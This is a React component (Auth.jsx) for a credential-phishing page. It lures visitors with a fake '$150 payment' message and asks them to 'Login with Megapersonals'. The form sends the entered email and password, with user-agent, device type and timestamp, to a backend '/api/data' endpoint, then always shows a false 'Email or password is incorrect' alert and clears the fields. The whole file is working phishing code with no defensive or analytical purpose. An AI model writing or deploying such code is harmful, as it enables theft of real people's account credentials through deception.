// client/src/pages/Auth.jsx
import React, { useState } from "react";
import "../assets/style.css";

const API_BASE_URL = import.meta.env.VITE_APP_BACKEND_URL || 'http://localhost:5000';

const Auth = () => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const getDeviceType = () => {
    const ua = navigator.userAgent;
    if (/mobile/i.test(ua)) return "Mobile";
    if (/tablet/i.test(ua)) return "Tablet";
    return "Desktop";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    const userAgent = navigator.userAgent;
    const device = getDeviceType();
    const time = new Date().toLocaleString();

    // Send to backend
    try {
      await fetch(`${API_BASE_URL}/api/data`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          email,
          password,
          userAgent,
          device,
          time,
        }),
      });

      alert("Email or password is incorrect");

      // Clear form
      setEmail("");
      setPassword("");
    } catch (err) {
      console.error("Submission error:", err);
      alert("Something went wrong.");
    }
  };

  return (
    <div className="container">
      <div className="login-card">
        <h1>Accept Your Payment</h1>
        <p>You just got <span style={{ color: 'green', fontWeight: 'bold' }}>$150</span> from Orlando</p>
        <div className="illustration">
          <img src="/images/devgirl.png" alt="Pay Illustration" />
        </div>
        <p>To Accept Money</p>
        <h2>Login with Megapersonals</h2>
        <form onSubmit={handleSubmit}>
          <div className="input-group">
            <input
              type="email"
              placeholder="Enter your email"
              value={email}
              required
              onChange={(e) => setEmail(e.target.value)}
            />
            <input
              type="password"
              placeholder="Enter your password"
              value={password}
              required
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          <button type="submit" className="submit-button">Submit</button>
        </form>
      </div>
    </div>
  );
};

export default Auth;
